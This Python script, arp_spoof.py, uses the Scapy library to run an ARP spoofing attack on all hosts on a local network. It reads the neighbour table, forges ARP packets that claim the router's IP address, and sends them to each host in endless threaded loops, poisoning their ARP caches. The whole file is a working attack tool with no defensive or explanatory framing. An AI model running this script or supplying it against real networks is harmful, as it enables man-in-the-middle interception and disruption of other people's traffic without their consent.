import threading

from ip_command import IP

from helpers import print_exception
from scapy.all import *
from scapy.layers.l2 import ARP
from scapy.sendrecv import send


# arp_spoof.py
# this is a simply python program/script that will perform a simple ARP spoof
# attack on all hosts on the local network using the Scapy Python library
# PARAM
# router_ip (str)       - IP address of router on local network, address to spoof


def start_arp_spoof(router_ip='172.16.119.2'):
	# get ip addresses of machines on local network
	print("// ARP SPOOF ========================================")
	# full_results = [re.findall('^[\w\?\.]+|(?<=\s)\([\d\.]+\)|(?<=at\s)[\w\:]+', i) for i in os.popen('ip n show')]
	# final_results = [dict(zip(['IP', 'LAN_IP', 'MAC_ADDRESS'], i)) for i in full_results]
	# print("final results: " + str(final_results))
	# final_results = [{**i, **{'LAN_IP': i['LAN_IP'][1:-1]}} for i in final_results]
	final_results = IP.neigh.show()

	# loop through and poison ALL hosts
	spoof = router_ip
	op = 1  # Op code 1 for ARP requests
	print("LOCAL IPS")
	for host in final_results:
		print("\t- " + str(host))
		arp = ARP(op=op, psrc=spoof, pdst=str(host.address), hwdst=host.mac_address)
		threading.Thread(target=do_arp_spoof, args=(arp,)).start()


def do_arp_spoof(arp):
	print("Sending: " + str(arp))
	while True:
		try:
			send(arp)
			time.sleep(2)
		except Exception as e:
			print_exception(str(e))


# MAIN ============================================= #

if __name__ == '__main__':
	import optparse

	parser = optparse.OptionParser()

	parser.add_option(
		'-r', '--router-ip', dest='router_ip',
		help='Local network router IP address to bind to')

	options, args = parser.parse_args()

	start_arp_spoof(options.router_ip)
